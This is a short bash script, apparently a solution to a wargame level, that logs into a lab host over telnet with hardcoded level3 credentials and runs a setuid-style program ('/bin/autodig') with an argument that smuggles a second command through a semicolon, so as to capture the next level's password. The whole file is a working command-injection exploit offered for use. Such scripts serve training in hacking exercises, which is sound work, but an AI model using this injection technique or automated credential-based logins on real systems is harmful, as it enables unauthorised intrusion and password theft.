#!/bin/bash

# Description:
# This is Remote Exploit tool to get level4's password

export TERM=xterm
export LANG=en_US.UTF8
export IP1=192.168.10.240
export PORT1=23
export USER1="level3"
export PASS1="can you fly?"
export CMD1="/bin/autodig '8.8.8.8 www.naver.com;my-pass;'"
export LOG1="level3.log"

attack() {
    sleep 2; echo "$PASS1"
    sleep 1; echo "$CMD1"
    sleep 1; echo "exit"
}

> $LOG1 && echo "[*] Log file created."
echo "[*] Level3 attack started. Please wait...."
attack | telnet -l $USER1 $IP1 $PORT1 >> $LOG1 2>&1

echo "[+] Level4 password cracked."
grep 'Level4 Password' $LOG1
